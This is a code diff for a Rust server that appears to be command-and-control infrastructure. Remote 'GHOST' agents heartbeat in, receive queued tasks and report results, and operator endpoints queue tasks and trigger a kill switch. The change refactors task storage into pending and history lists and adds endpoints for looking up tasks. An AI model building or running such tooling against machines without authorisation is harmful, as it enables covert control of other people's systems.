@@ -70,7 +70,8 @@ pub struct TaskRequest {
 // === SHARED STATE ===
 pub struct ServerState {
     pub ghosts: DashMap<String, Ghost>,
-    pub tasks: DashMap<String, Vec<Task>>
+    pub pending_tasks: DashMap<String, Vec<Task>>,
+    pub task_history: DashMap<String, Vec<Task>>
 }
 
 // === API handlers ===
@@ -98,12 +99,17 @@ async fn handle_ghost_heartbeat(
     }
 
     if let Some(results) = req.results {
-        if let Some(mut tasks) = state.tasks.get_mut(&req.id) {
+        if let Some(mut pending_list) = state.pending_tasks.get_mut(&req.id) {
             for r in results {
-                if let Some(task) = tasks.iter_mut().find(|t| t.id == r.task_id) {
-                    println!("task {} completed by GHOST {}", r.task_id, req.id);
+                if let Some(idx) = pending_list.iter().position(|t| t.id == r.task_id) {
+                    let mut task = pending_list.remove(idx);
+
                     task.status = r.status;
                     task.result = Some(r.output);
+
+                    println!("task {} completed by GHOST {}", r.task_id, req.id);
+                    
+                    state.task_history.entry(req.id.clone()).or_insert_with(Vec::new).push(task);
                 }
             }
         }
@@ -111,7 +117,7 @@ async fn handle_ghost_heartbeat(
 
     let mut outgoing_tasks = Vec::new();
 
-    if let Some(mut tasks) = state.tasks.get_mut(&req.id) {
+    if let Some(mut tasks) = state.pending_tasks.get_mut(&req.id) {
         for task in tasks.iter_mut().filter(|t| t.status == "pending") {
             outgoing_tasks.push(TaskDefinition {
                 id: task.id.clone(),
@@ -154,6 +160,42 @@ async fn handle_charon_get_ghost(
     Json(ghost)
 }
 
+async fn handle_charon_get_ghost_tasks(
+    Path(id): Path<String>,
+    State(state): State<Arc<ServerState>>
+) -> Json<Vec<Task>> {
+    let mut all_tasks = Vec::new();
+
+    if let Some(history) = state.task_history.get(&id) {
+        all_tasks.extend(history.value().clone());
+    }
+
+    if let Some(pending) = state.pending_tasks.get(&id) {
+        all_tasks.extend(pending.value().clone());
+    }
+
+    Json(all_tasks)
+}
+
+async fn handle_charon_get_task_details(
+    Path(task_id): Path<String>,
+    State(state): State<Arc<ServerState>>
+) -> Json<Option<Task>> {
+    for entry in state.pending_tasks.iter() {
+        if let Some(task) = entry.value().iter().find(|t| t.id == task_id) {
+            return Json(Some(task.clone()));
+        }
+    }
+
+    for entry in state.task_history.iter() {
+        if let Some(task) = entry.value().iter().find(|t| t.id == task_id) {
+            return Json(Some(task.clone()));
+        }
+    }
+
+    Json(None)
+}
+
 async fn handle_charon_queue_task(
     Path(id): Path<String>,
     State(state): State<Arc<ServerState>>,
@@ -169,7 +211,7 @@ async fn handle_charon_queue_task(
 
     println!("task {} queued for GHOST {}", new_task.id, id);
 
-    state.tasks.entry(id).or_insert_with(Vec::new).push(new_task);
+    state.pending_tasks.entry(id).or_insert_with(Vec::new).push(new_task);
 }
 
 async fn handle_charon_kill_ghost(
@@ -186,7 +228,7 @@ async fn handle_charon_kill_ghost(
 
     println!("kill signal queued for GHOST {}", id);
 
-    state.tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
+    state.pending_tasks.entry(id).or_insert_with(Vec::new).push(kill_task);
 }
 
 pub fn app(state: Arc<ServerState>) -> Router {
@@ -200,6 +242,8 @@ pub fn app(state: Arc<ServerState>) -> Router {
         .route("/ghosts", get(handle_charon_list_ghosts))           // list active GHOSTs
         .route("/ghosts/{id}", get(handle_charon_get_ghost))         // get details about a GHOST
         .route("/ghosts/{id}/task", post(handle_charon_queue_task))  // assign a task to GHOST
+        .route("/ghosts/{id}/tasks", get(handle_charon_get_ghost_tasks))    // get all tasks for GHOST
+        .route("/tasks/{id}", get(handle_charon_get_task_details))    // get single task details
         .route("/ghosts/{id}/kill", post(handle_charon_kill_ghost)); // killswitch for GHOST
 
     // init router with route -> handler mapping
